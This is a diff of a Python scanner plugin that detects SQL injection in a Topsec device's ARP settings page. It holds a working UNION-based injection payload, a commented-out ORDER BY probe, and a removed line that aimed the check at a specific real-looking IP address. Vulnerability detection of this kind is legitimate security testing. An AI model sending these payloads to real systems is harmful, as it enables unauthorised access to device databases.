@@ -14,16 +14,17 @@ def assign(service, arg):
         return True, '%s://%s/' % (arr.scheme, arr.netloc)
 def audit(arg):
     payload = 'acc/bindipmac/static_arp_setting_content.php?arpName=123%27%20UNION%20ALL%20SELECT%20NULL,strftime(%27%s%27,%272015-11-11%27),NULL,NULL,NULL,NULL,NULL,NULL--'
-    target = arg + payload    
+    target = arg + payload
     code, head, res, errcode, _ = curl.curl2(target);
     #strftime('%s','2015-11-11')=1447200000
     if '1447200000' in res:
         security_hole(target)
-    # payload = 'acc/bindipmac/static_arp_include.php?ifName=123%27%20order%20by%202--'
-    # target = arg + payload
-    # code, head, res, errcode, _ = curl.curl2(target);
-    # if 'Fatal error' in res and 'ORDER BY' in res:
-    #     security_hole(target)
-if __name__ == '__main__':
+        # payload = 'acc/bindipmac/static_arp_include.php?ifName=123%27%20order%20by%202--'
+        # target = arg + payload
+        # code, head, res, errcode, _ = curl.curl2(target);
+        # if 'Fatal error' in res and 'ORDER BY' in res:
+        #     security_hole(target)
+
+        return arg
+if __name__== '__main__':
     from dummy import *
-    audit(assign('topsec', 'http://61.148.24.182/')[1])
